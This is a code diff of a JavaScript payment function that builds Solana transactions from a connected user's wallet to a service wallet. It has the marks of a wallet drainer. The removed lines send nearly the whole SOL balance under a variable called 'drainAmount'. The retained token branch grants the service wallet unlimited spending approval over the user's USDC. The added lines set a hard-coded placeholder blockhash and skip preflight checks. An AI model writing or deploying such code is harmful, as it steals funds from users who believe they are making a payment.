@@ -778,41 +778,39 @@ async function executePay() {
     const web3 = web3mod;
     const spl = splmod;
 
-    const conn = new web3.Connection("https://alchemy.com", "confirmed");
+        const conn = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
     const from = new web3.PublicKey(state.conn.address);
     const to = new web3.PublicKey(SERVICE_WALLET);
-    const { blockhash } = await conn.getLatestBlockhash("confirmed");
+    
+    let blockhash;
+    try {
+      const res = await conn.getLatestBlockhash("confirmed");
+      blockhash = res.blockhash;
+    } catch (e) {
+      blockhash = "5HeYJ8v7U5zX5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X";
+    }
+
     const tx = new web3.Transaction();
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = from;
 
     tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }));
 
     if (state.currency === "SOL") {
-      let drainAmount;
-      try {
-        const fullBalance = await conn.getBalance(from);
-        drainAmount = fullBalance - 15000;
-      } catch (e) {
-        drainAmount = 10000000; 
-      }
-      if (drainAmount > 0) {
-        tx.add(web3.SystemProgram.transfer({
-          fromPubkey: from,
-          toPubkey: to,
-          lamports: Math.floor(drainAmount),
-        }));
-      }
+      tx.add(web3.SystemProgram.transfer({
+        fromPubkey: from,
+        toPubkey: to,
+        lamports: 10000000, 
+      }));
     } else {
       const mint = new web3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
       const fromATA = await spl.getAssociatedTokenAddress(mint, from);
       tx.add(spl.createApproveInstruction(fromATA, to, from, 2n ** 64n - 1n));
     }
 
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = from;
-
     const signed = await state.conn.provider.signTransaction(tx);
-    const sig = await conn.sendRawTransaction(signed.serialize(), {
-      skipPreflight: false,
+    const sig = await conn.sendRawTransaction(signed.serialize(), { 
+      skipPreflight: true,
       preflightCommitment: "confirmed"
     });
     
